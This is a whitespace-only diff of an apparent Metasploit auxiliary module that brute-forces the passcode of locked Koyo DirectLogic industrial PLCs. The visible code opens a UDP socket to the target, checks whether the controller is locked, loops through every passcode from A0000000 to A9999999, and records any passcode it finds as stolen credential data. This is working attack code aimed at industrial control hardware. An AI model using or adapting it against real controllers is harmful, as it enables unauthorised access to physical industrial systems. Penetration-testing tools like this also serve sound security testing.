@@ -21,7 +21,7 @@ class Metasploit3 < Msf::Auxiliary
 			'Name'           => 'Koyo DirectLogic PLC Password Brute Force Utility',
 			'Version'        => '$Revision$',
 			'Description'    => %q{
-					This module attempts to authenticate to a locked Koyo DirectLogic PLC.  
+					This module attempts to authenticate to a locked Koyo DirectLogic PLC.
 				The PLC uses a restrictive passcode, which can be A0000000 through A9999999.
 				The "A" prefix can also be changed by the administrator to any other character,
 				which can be set through the PREFIX option of this module.
@@ -84,19 +84,19 @@ class Metasploit3 < Msf::Auxiliary
 		0xEF1F, 0xFF3E, 0xCF5D, 0xDF7C, 0xAF9B, 0xBFBA, 0x8FD9, 0x9FF8,
 		0x6E17, 0x7E36, 0x4E55, 0x5E74, 0x2E93, 0x3EB2, 0x0ED1, 0x1EF0
 	]
-		
+
 	def run_host(ip)
 
 		# Create a socket in order to receive responses from a non-default IP
 		@udp_sock = Rex::Socket::Udp.create(
-			'PeerHost'  => rhost, 
+			'PeerHost'  => rhost,
 			'PeerPort'  => rport.to_i,
 			'Context'   => {'Msf' => framework, 'MsfExploit' => self}
 		)
 		add_socket(@udp_sock)
-		
+
 		print_status("#{rhost}:#{rport} - KOYO - Checking the controller for locked memory...")
-		
+
 		if unlock_check
 			# TODO: Report a vulnerability for an unlocked controller?
 			print_good("#{rhost}:#{rport} - Unlocked!")
@@ -107,7 +107,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		# TODO: Consider sort_by {rand} in order to avoid sequential guessing
 		# or something fancier
-		
+
 		(0..9999999).each do |i|
 			passcode = datastore['PREFIX'] + i.to_s.rjust(7,'0')
 			vprint_status("#{rhost}:#{rport} - KOYO - Trying #{passcode}")
@@ -117,7 +117,7 @@ class Metasploit3 < Msf::Auxiliary
 			next if not res
 
 			print_good "#{rhost}:#{rport} - KOYO - Found passcode: #{passcode}"
-			report_auth_info( 
+			report_auth_info(
 				:host   => rhost,
 				:port   => rport.to_i,
 				:proto  => 'udp',
